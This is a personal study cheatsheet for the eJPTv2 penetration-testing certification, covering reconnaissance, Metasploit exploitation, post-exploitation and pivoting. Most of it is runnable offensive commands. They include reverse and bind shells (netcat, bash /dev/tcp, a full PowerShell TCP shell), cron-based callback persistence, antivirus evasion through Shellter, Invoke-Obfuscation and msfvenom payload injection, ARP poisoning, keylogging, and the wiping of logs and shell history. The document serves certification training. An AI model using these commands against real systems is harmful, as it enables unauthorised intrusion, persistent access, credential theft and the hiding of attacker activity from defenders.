# eJPTv2 Cheatsheet
- To Do
  - Finish 3.3
  - Finish 3.4
  - Rewatch 3.1
  - Rewatch 1.1, 1.2, 1.3, 1.4
  - Review old notes
  - Take Exam

# Index
- [General](#General)
- [Information Gathering and Enumeration](#Information-Gathering-and-Enumeration)
- [Exploitation](#Exploitation)
- [Post-Exploitation](#Post-Exploitation)

# General
- [Metasploit](#Metasploit)
  - [Meterpreter](#Meterpreter)
- [Resource Scripts](#Resource-Scripts)
- [tmux](#tmux)
- [windows-resources](#windows-resources)

## Metasploit
[<< Index](#Index)
```
sudo apt update
sudo apt install metasploit-framework

sudo systemctl enable postgresql
sudo systemctl start postgresql
systemctl status postgresql

msfdb
sudo msfdb init
sudo msfdb reinit
sudo msfdb status
```
```
sudo service postgresql start
service postgresql status

msfconsole -q
db_status

workspace -a <workspace>
workspace

setg RHOSTS <ip>
setg RHOST <ip>
```
```
sessions -h
sessions -l
sessions -i <session_id>
sessions -k <session_id>
sessions -K
sessions -C <command> -i <session_id>
```
```
Hold Ctrl + M + L to clear screen
```
```
hosts
services
creds
analyze

vulns
vulns -p <port>
```
```
connect <ip> <port>
```

### Meterpreter
[<< Index](#Index)
```
meterpreter > help
meterpreter > exit
meterpreter > background (or Ctrl + Z)
```
- `help` will show different commands for Windows and Linux.

```
meterpreter > search -d /usr/bin -f *<keyword>*
meterpreter > search -f *.<extension>

meterpreter > download <filename>
meterpreter > upload <filename>
```
```
meterpreter > ps
meterpreter > ps -S <process>
meterpreter > pgrep <process>
meterpreter > migrate <pid>
meterpreter > migrate -N explorer.exe
meterpreter > migrate -N lsass.exe
meterpreter > getpid
```

## Resource Scripts
[<< Index](#Index)
```
/usr/share/metasploit-framework/scripts/resource
```
```
use multi/handler
set payload <payload>
set LHOST <ip>
set LPORT <port>
exploit

vi handler.rc
use multi/handler
set PAYLOAD <payload>
set LHOST <ip>
set LPORT <port>
exploit

msfconsole -r handler.rc
```
```
msf6 > resource handler.rc
```
```
msf6 > use multi/handler
msf6 > set PAYLOAD <payload>
msf6 > set LHOST <ip>
msf6 > set LPORT <port>
msf6 > exploit
^C
msf6 > makerc handler.rc
```

## tmux
[<< Index](#Index)
```
tmux
tmux ls
tmux attach -t <session_id>
```
```
Ctrl + B, D — Detach from the current session.
Ctrl + B, C — Create a new window.
Ctrl + B, 0 (1,2...) — Move to a specific window by number.
```

## windows-resources
[<< Index](#Index)
- `/usr/share/windows-resources/`
- `/usr/share/windows-resources/binaries/`

# Information Gathering and Enumeration
[<< Index](#Index)
- [FTP](#FTP)
- [HTTP](#HTTP)
  - [WMAP](#WMAP)
- [metasploit-autopwn](#metasploit-autopwn)
- [MySQL](#MySQL)
- [Port Scanning](#Port-Scanning)
- [SMB/Samba](#SMBSamba)
- [SMTP](#SMTP)
- [SSH](#SSH)
- [Vulnerability Scanning](#Vulnerability-Scanning)
- [WinRM](#WinRM)
- [Wordlists](#Wordlists)

```
set USER_FILE <wordlist>
set PASS_FILE <wordlist>
set USERNAME <username>
set PASSWORD <password>
set VERBOSE <boolean>
set STOP_ON_SUCCESS <boolean>
```
- Set these options accordingly and as needed for brute-force attacks.

## FTP
[<< Index](#Index)
```
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
```

## HTTP
[<< Index](#Index)
```
use auxiliary/scanner/http/http_version
```
- Change `RPORT` and `SSL` if dealing with HTTPS.

```
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/options
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/dir_scanner
```
```
use auxiliary/scanner/http/files_dir
```
- Can specify `EXT` to focus on specific file extension.

```
use auxiliary/scanner/http/http_login
set AUTH_URI <directory>
set --clear USERPASS_FILE
```
- `unset USERPASS_FILE` reverts to default value.

```
use auxiliary/scanner/http/apache_userdir_enum
```
- Apache only.

```
use auxiliary/scanner/http/http_put
```
- Change `PATH` to directory being tested.
- Change `FILEDATA` and `FILENAME` accordingly if uploading a payload.

```
curl http://<ip>:<port>
curl http://<ip>/robots.txt
curl http://<ip>/phpinfo.php
```
```
curl http://<ip>/<directory>/
```
- Check if directory listing (Apache) is enabled i.e. `Index of /<directory>`.

### WMAP
[<< Index](#Index)
```
load wmap
wmap_sites -h
wmap_sites -a <ip>
wmap_sites -l
wmap_targets -h
wmap_targets -t http://<ip>
wmap_targets -l
```
- Web app vulnerability scanner.
- Uses built-in MSF modules.
- Available as MSF plugin (`wmap.rb`).

```
wmap_run -h
wmap_run -t
wmap_run -e

wmap_vulns -h
wmap_vulns -l
```

## metasploit-autopwn
[<< Index](#Index)
```
load db_autopwn
db_autopwn -p -t
db_autopwn -p -t -PI <port>
```
- https://github.com/hahwul/metasploit-autopwn
- No longer in official MSF distro.

## MySQL
[<< Index](#Index)
```
use auxiliary/scanner/mysql/mysql_version
```
```
use auxiliary/scanner/mysql/mysql_login
```
- Prioritize `root` account.

```
use auxiliary/admin/mysql/mysql_enum
```
- Includes account enumeration - hashes, privileges.
  - https://crackstation.net/
  - Hashcat:
    - `echo <hash> > hash`
    - `hashcat -m300 -a0 hash /usr/share/wordlists/rockyou.txt`
    - `cat .hashcat/hashcat.potfile`

```
use auxiliary/admin/mysql/mysql_sql
```
- Non-`root` account may not work i.e. access denied.
- Other SQL: `set SQL show databases;`

```
use auxiliary/scanner/mysql/mysql_schemadump
```
```
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST <wordlist>
```
```
use auxiliary/scanner/mysql/mysql_hashdump
```
```
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST <wordlist>
```

```
mysql -h <ip> -u root -p

MySQL [(none)]>
MySQL [(none)]> show databases;
```

## Port Scanning
[<< Index](#Index)
```
nmap -Pn -sV <ip>
```
- Useful flags
  - `-p<port>`
  - `-p-`
  - `-F`
  - `-O`
  - `-sC`
  - `-A`
  - `-sU`
  - `-sn`
  - `-T<0 to 5>`

```
nmap -Pn -sV <ip> -oX results
db_import results
```
```
db_nmap -Pn -sV <ip>
```
```
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/discovery/udp_sweep
```

## SMB/Samba
[<< Index](#Index)
```
use auxiliary/scanner/smb/smb_version
```
- If SMBv1, check for EternalBlue.

```
use auxiliary/scanner/smb/smb_enumusers
```
```
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
```
```
use auxiliary/scanner/smb/smb_login
```
- Prioritize `administrator` account.

```
nmap -Pn -sV -p445 --script=smb-os-discovery <ip>
```

```
smbclient -L \\\\<ip>\\ -U <username>

smbclient -L \\\\<ip>\\<share> -U <username>
smb: \> ls
smb: \> cd <directory>
smb: \> get <filename>
smb: \> exit
```
```
smbclient -L <ip> -N
rpcclient -U "" -N <ip>
```
- If successful, anonymous connection (null session) is allowed.

```
nmblookup -A <ip>
```

## SMTP
[<< Index](#Index)
```
nmap -Pn -sV -p25 --script=banner <ip>
```
```
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
```

## SSH
[<< Index](#Index)
```
use auxiliary/scanner/ssh/ssh_version
```
```
use auxiliary/scanner/ssh/ssh_login
```
- Opens a reverse command shell (non-meterpreter) with credentials found.

```
use auxiliary/scanner/ssh/ssh_enumusers
```

## Vulnerability Scanning
[<< Index](#Index)
```
db_import <filename>
```
- Export scan results to .nessus (XML) file.

```
nmap -Pn -sV --script=vuln <ip>
```

## WinRM
[<< Index](#Index)
```
nmap -Pn -sV -p5985,5986 <ip>
nmap -Pn -sV -p- <ip>
```
- Default nmap scan (top 1000 ports) will not check WinRM ports.
- nmap may not identify WinRM service properly too.

```
use auxiliary/scanner/winrm/winrm_auth_methods
use auxiliary/scanner/winrm/winrm_login
```
```
use auxiliary/scanner/winrm/winrm_cmd
set CMD <command>
```
- Needs credentials.

## Wordlists
[<< Index](#Index)
```
/usr/share/wordlists/
/usr/share/wordlists/rockyou.txt
```
```
/usr/share/metasploit-framework/data/wordlists/
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/http_default_users.txt
/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
/usr/share/metasploit-framework/data/wordlists/namelist.txt
/usr/share/metasploit-framework/data/wordlists/directory.txt
```
```
/usr/share/metasploit-framework/data/wmap/
/usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
/usr/share/metasploit-framework/data/wmap/wmap_files.txt
```

# Exploitation
[<< Index](#Index)
- FTP
  - [ProFTPD 1.3.3c](#ProFTPD-133c) 
  - [vsftpd 2.3.4](#vsftpd-234)
- HTTP
  - [Apache Tomcat 8.5.19](#Apache-Tomcat-8519)
  - [BadBlue httpd 2.7](#BadBlue-httpd-27)
  - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
  - [Xdebug <= v2.5.5](#Xdebug--v255)
  - [XODA 0.4.5](#XODA-045)
- SMB/Samba
  - [EternalBlue](#EternalBlue)
  - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
- SMTP
  - [Haraka <2.8.9](#Haraka-289)
- SSH
  - [libssh v0.6.0-0.8.0](#libssh-v060-080)
- [WinRM](#WinRM)
- Others
  - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
- [ARP Poisoning](#ARP-Poisoning)
- [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
- [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
  - [msfvenom](#msfvenom)
- [Linux Compilation](#Linux-Compilation)
- [Windows Cross-Compilation](#Windows-Cross-Compilation)

```
check
```
- For MSF modules that don't have an auxiliary scanner to confirm vulnerability (like EternalBlue), try `check`.

## FTP
### ProFTPD 1.3.3c
[<< Index](#Index)
```
use exploit/unix/ftp/proftpd_133c_backdoor
```

### vsftpd 2.3.4
[<< Index](#Index)
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

## HTTP
### Apache Tomcat 8.5.19
[<< Index](#Index)
```
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set SHELL cmd
```
- Why use non-staged, bind shell payload?
- If exploit fails, try again.

```
sessions -l
```
- Because shell is `shell java/linux`, cannot upgrade to meterpreter.
- Cannot specify a meterpreter payload via the module too.
- Generate payload with msfvenom instead.

### BadBlue httpd 2.7
[<< Index](#Index)
```
use exploit/windows/http/badblue_passthru
```

### Rejetto HttpFileServer 2.3
[<< Index](#Index)
```
use exploit/windows/http/rejetto_hfs_exec
```
```
searchsploit -m 39161

cd ~/Desktop
cp /usr/share/windows-resources/binaries/nc.exe ./
python -m SimpleHTTPServer 80

vi 39161.py
Change ip_addr and local_port
nc -nvlp <port>

python 39161.py <ip> <port>
```

### Xdebug <= v2.5.5
[<< Index](#Index)
```
use exploit/unix/http/xdebug_unauth_exec
```

### XODA 0.4.5
[<< Index](#Index)
```
use exploit/unix/webapp/xoda_file_upload
```
- Change `TARGETURI` i.e. if XODA is running from the `/` directory instead of `/xoda/`.

## SMB/Samba
### EternalBlue
[<< Index](#Index)
```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```
- SMBv1 only.

### Samba smbd 3.X - 4.X
[<< Index](#Index)
```
use exploit/linux/samba/is_known_pipename
```

## SMTP
### Haraka <2.8.9
[<< Index](#Index)
```
use exploit/linux/smtp/haraka
set SRVPORT <port1>
set email_to <email>
set payload linux/x64/meterpreter_reverse_http
set LPORT <port2>
exploit
```
- Payload is non-staged.
- `<port1>` hosts the payload, `<port2>` is the reverse handler.
- `email_to` must be valid i.e. `xxx@<valid_domain>`.

## SSH
### libssh v0.6.0-0.8.0
[<< Index](#Index)
```
use auxiliary/scanner/ssh/libssh_auth_bypass
set SPAWN_PTY true
```

## WinRM
[<< Index](#Index)
```
use exploit/windows/winrm/winrm_script_exec
set FORCE_VBS true
```
- Needs credentials.

## Others
### Exploit Database Binary Exploits
[<< Index](#Index)
- https://gitlab.com/exploit-database/exploitdb-bin-sploits

## ARP Poisoning
[<< Index](#Index)
```
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```
```
arpspoof -i <interface> -t <ip1> -r <ip2>
```
```
sudo wireshark -i <interface> -k
```

## AV Evasion and Obfuscation
[<< Index](#Index)
```
sudo apt install shellter -y

sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32 -y
```
```
mkdir ~/Desktop/AVBypass
cp /usr/share/windows-resources/binaries/vncviewer.exe ~/Desktop/AVBypass/vncviewer.exe

cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```
- Backup of EXE at `/usr/share/windows-resources/shellter/Shellter_Backups`.
- Select Stealth mode - `vncviewer.exe` will function normally.

```
cd ~/Desktop/AVBypass
git clone https://github.com/danielbohannon/Invoke-Obfuscation

sudo apt install powershell -y
```
```
$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- https://github.com/swisskyrepo/PayloadsAllTheThings
- Remove `powershell -nop -c` and double-quotes `"`, then save as `shell.ps1`.

```
pwsh
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation
```
```
SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
ENCODING
1
```
```
BACK

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
AST
ALL
1
```

## MSF Payloads and Listeners
[<< Index](#Index)
- 64-bit (`x64`) payload cannot run on 32-bit architecture.
- Staged payload (exploit and shellcode sent separately).
- Non-staged/inline payload (exploit and shellcode sent together).
  - `windows/x64/meterpreter/reverse_tcp` is staged.
  - `windows/x64/meterpreter_reverse_tcp` is non-staged/inline.

```
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp

windows/meterpreter/bind_tcp
windows/x64/meterpreter/bind_tcp

linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
```
```
use multi/handler
set payload <payload>
set LHOST <ip>
set LPORT <port>
```
- For quick reference.

### msfvenom
[<< Index](#Index)
#### Generating Payloads
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

```
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>
```
- `<architecture>`: `x86`, `x64`
- `<payload>`: Pick your poison from `msfvenom --list payloads`.
- `<format>`: Pick your poison from `msfvenom --list formats` e.g. `elf`, `exe`, `aspx`.

#### Encoding Payloads
- Not effective against modern AVs.

```
msfvenom --list encoders
```
- `x86/shikata_ga_nai` is the best encoder option.

```
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f <format> > <filename>
```
- Having more iterations increases the chances of evading AVs.

#### Injecting Payloads into Window PEs
```
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f exe -x <PE_1> > <PE_2>
```
- `-k` will preserve the original functionality of `<PE_1>`; may not work for every PE.

## Linux Compilation
[<< Index](#Index)
```
searchsploit -m 40839

gcc -pthread 40839.c -o dirty -lcrypt
```

## Windows Cross-Compilation
[<< Index](#Index)
```
sudo apt-get install mingw-w64 gcc
```
```
searchsploit -m 9303

i686-w64-mingw32-gcc 9303.c -o exploit
i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
```
- Use 32-bit if unsure of target architecture.

# Post-Exploitation
[<< Index](#Index)
- Local Enumeration
  - [Windows](#Windows)
  - [Linux](#Linux)
- Privilege Escalation
  - [SUDO Privileges](#SUDO-Privileges)
  - [SUID Binaries](#SUID-Binaries)
  - [Token Impersonation](#Token-Impersonation)
  - [UAC Bypass](#UAC-Bypass)
- Maintaining Persistent Access
  - Windows
    - [RDP](#RDP)
    - [Services](#Services)
  - Linux
    - [Cron Jobs](#Cron-Jobs)
    - [SSH Keys](#SSH-Keys)
- Clearing Tracks
  - [Linux History](#Linux-History)
  - [Resource Scripts](#Resource-Scripts)
  - [Windows Event Logs](#Windows-Event-Logs)
- [Bind and Reverse Shells](#Bind-and-Reverse-Shells)
- [Keylogging](#Keylogging)
- [Pivoting](#Pivoting)
- [Transfer Files](#Transfer-Files)
- [Upgrade Shells](#Upgrade-Shells)
- [Working Directories](#Working-Directories)

## Local Enumeration
### Windows
[<< Index](#Index)
#### Enumerating System Information
```
meterpreter > sysinfo

hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
dir /b/s eula.txt
```

#### Enumerating Users & Groups
```
meterpreter > getuid
meterpreter > getprivs

whoami
whoami /priv
query user
net users
net user <username>
net localgroup
net localgroup <group>
net localgroup Administrators

use post/windows/gather/enum_logged_on_users
set SESSION <session_id>
```

#### Enumerating Network Information
```
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles
```
- Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output.

#### Enumerating Processes & Services
```
meterpreter > ps
meterpreter > ps -S <process>
meterpreter > pgrep <process>

net start
wmic service list brief
tasklist
tasklist /SVC

mkdir C:\Temp
schtasks /query /fo LIST /v > C:\Temp\schtasks.txt
exit

meterpreter > download C:\\Temp\\schtasks.txt

cat schtasks.txt
```
- `/SVC` shows the services hosted by the process.

#### Automating Windows Local Enumeration
```
meterpreter > show_mount

use post/windows/manage/migrate
use post/windows/gather/win_privs
use post/windows/gather/checkvm
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/gather/enum_av_excluded

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.
- `win_privs` will also check if UAC is enabled.

#### JAWS - Just Another Windows Script
```
meterpreter > mkdir C:\\Temp
meterpreter > cd C:\\Temp
meterpreter > upload /root/jaws-enum.ps1
meterpreter > shell

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
exit

meterpreter > download C:\\Temp\\jaws-enum.txt
cat jaws-enum.txt
```
- https://github.com/411Hall/JAWS

### Linux
[<< Index](#Index)

## Privilege Escalation
[<< Index](#Index)
```
meterpreter > getsystem
```
- https://docs.rapid7.com/metasploit/meterpreter-getsystem/

### SUDO Privileges
[<< Index](#Index)
```
sudo -l
```
- https://gtfobins.github.io/

### SUID Binaries
[<< Index](#Index)
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```
- https://gtfobins.github.io/

### Token Impersonation
[<< Index](#Index)

### UAC Bypass
[<< Index](#Index)
```
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION <session_id>
set LPORT <port>
set target 1

meterpreter > getsystem
```
- Need to have a 64-bit meterpreter session (session_1).
- Change `LPORT` to avoid conflict with existing session(s).
- Set `target` to `1` (Windows x64).
- `getsystem` works in session_2 but UAC flag was still set - why?

## Maintaining Persistent Access


## Clearing Tracks
### Linux History
[<< Index](#Index)
```
cat /dev/null > ~/.bash_history
history -c
```

### Resource Scripts
[<< Index](#Index)
```
meterpreter > resource <filename>
```

### Windows Event Logs
[<< Index](#Index)
```
meterpreter > clearev
```

## Bind and Reverse Shells
[<< Index](#Index)
```
nc -help

-n : do not resolve hostnames
-v : verbosity, can be used multiple times
-l : listen
-p : local port number
-u : UDP instead of TCP
-e : execute command
```
```
cd /usr/share/windows-resources/binaries/
python -m SimpleHTTPServer 80

certutil -urlcache -f http://<ip>/nc.exe nc.exe
nc.exe -h
```
- Windows does not have `netcat` by default.

### Transferring Files
[<< Index](#Index)
```
nc -nvlp <port> > received.txt
nc -nv <ip> <port> < sent.txt
```

### Bind Shells
[<< Index](#Index)
```
nc -nvlp <port> -e /bin/bash
nc -nv <ip> <port>

nc -nvlp <port> -e cmd.exe
nc -nv <ip> <port>
```

### Reverse Shells
[<< Index](#Index)
```
nc -nvlp <port>
nc -nv <ip> <port> -e /bin/bash

nc -nvlp <port>
nc -nv <ip> <port> -e cmd.exe
```
```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

## Keylogging
[<< Index](#Index)
```
meterpreter > getdesktop

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
```
meterpreter > migrate -N winlogon.exe
```











## Linux Local Enumeration
### Enumerating System Information
```
meterpreter > sysinfo
meterpreter > getenv PATH

hostname
cat /etc/issue && cat /etc/*release
uname -a
uname -r
env
lscpu
free -h
df -h
lsblk
dpkg -l
cat /etc/shells
```

### Enumerating Users & Groups
```
meterpreter > getuid

id
cat /etc/passwd
ls -l /home
groups
groups <username>
who
w
last
lastlog
```
- `uid=0` is root.

### Enumerating Network Information
```
meterpreter > ifconfig
meterpreter > netstat
meterpreter > route
meterpreter > arp

ip a s
arp -a
cat /etc/networks
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
```

### Enumerating Processes & Cron Jobs
```
meterpreter > ps
meterpreter > ps -S <process>
meterpreter > pgrep <process>

ps --help all
ps
ps aux
ps aux | grep root
ps aux | grep <process>
ps aux | grep -i <keyword>
top
crontab -l
crontab -l -u <username>
ls -al /etc/cron*
cat /etc/crontab
cat /etc/cron*
```

### Automating Linux Local Enumeration 
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system  
use post/linux/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.

### LinEnum
```
meterpreter > cd /tmp
meterpreter > upload /root/linenum.sh
meterpreter > ls
meterpreter > shell

/bin/bash -i
chmod +x linenum.sh
./linenum.sh
```
- https://github.com/rebootuser/LinEnum

## Linux Persistence Via Cron Jobs
```
ps -ef | grep cron

cat /etc/cron*
ls -al /etc/cron*

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron

crontab -i cron
crontab -l
```
```
nc -nvlp <port>
```

## Linux Persistence Via SSH Keys
```
ssh <username>@<ip>
cat .ssh/id_rsa

scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
chmod 400 id_rsa
ssh -i id_rsa <username>@<ip>
```

## Pivoting
```
meterpreter > ipconfig
meterpreter > arp
```
```
meterpreter > run autoroute -s <subnet>
meterpreter > run autoroute -p
```
- Use CIDR notation for `<subnet>`.

```
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip2>
```
```
meterpreter > portfwd add -l <port_local> -p <port_remote> -r <ip2>
meterpreter > portfwd list

netstat -an | grep LISTEN
nmap -Pn -sV -p<port_local> localhost
```
```
use <exploit>
set RHOSTS <ip2>
set RPORT <port_remote>
set payload windows/meterpreter/bind_tcp
```
- `LPORT` will be opened on `<ip2>`.

```
meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
```

## Transfer Files
- Set Up A Web Server With Python
```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```
- Windows: `certutil -urlcache -f http://<ip>/<filename> <filename>`
- Linux: `wget http://<ip>/<filename>`

## Upgrade Shells
- Non-interactive to interactive
```
cat /etc/shells
/bin/bash -i
```
```
which python python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
which python python3
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z

echo $TERM
stty -a
stty raw -echo
fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <columns>
```

- Non-meterpreter to meterpreter
```
sessions -u <session_id>
```
```
use post/multi/manage/shell_to_meterpreter
set LHOST <ip>
set SESSION <session_id>
set WIN_TRANSFER VBS
```

## Windows Persistence Via RDP
```
meterpreter > run getgui -e -u <username> -p <password>

xfreerdp /u:<username> /p:<password> /v:<ip>
```
- Meterpreter script to create a RDP backdoor.
- Password must meet complexity requirements.

## Windows Persistence Via Services
```
use exploit/windows/local/persistence_service
set SESSION <session_id>
```
- Admin or system privileges required.
- `RETRY_TIME` 5 seconds.
- Other settings more for blending in e.g. `SERVICE_NAME`.

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
```

## Working Directories
- Windows: `C:\Temp`
- Linux: `/tmp`
